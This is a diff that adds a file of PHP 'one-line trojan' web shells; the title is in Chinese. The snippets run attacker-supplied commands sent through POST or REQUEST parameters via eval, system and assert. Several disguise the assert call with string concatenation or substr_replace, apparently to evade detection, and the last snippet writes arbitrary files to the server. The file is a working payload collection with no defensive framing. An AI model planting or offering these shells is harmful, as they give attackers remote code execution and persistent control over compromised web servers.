@@ -1,0 +1,46 @@
+一句话木马源码（小马）
+<?php eval($_POST['cmd']); ?>
+
+
+<?php system($_POST['cmd']); ?>
+
+<?php $a=exec("mkdir nihao");echo $a; ?>
+
+<?php assert($_POST['cmd']) ?>
+
+<?php 
+$a = substr_replace("assexx", "rt", 4);
+$a($_POST['cmd']);
+?>
+
+<?php 
+function haha($a){
+  $a($_POST['cmd']);
+}
+haha(assert);
+?>
+
+<?php 
+$a = $_REQUEST['a'];
+$b = "\n";//在php里，如果需要使用\，得用""！！！！！！
+eval($b.=$a);
+?>
+
+<?php 
+//assert
+$a="a"."s";
+$b="s"."e"."r"."t";
+$c=$a.$b;
+$c($_POST['cmd']);
+?>
+
+<?php 
+if(isset($_POST['file'])){
+  $d = 'data';
+  $$d=$_POST['text']; //$data
+  $f = 'fp';
+  $$f = fopen($_POST['file'],'wb');//$fp
+  echo fwrite($fp, $data)?'save success':'fail';
+  fclose($fp);
+}
+?>
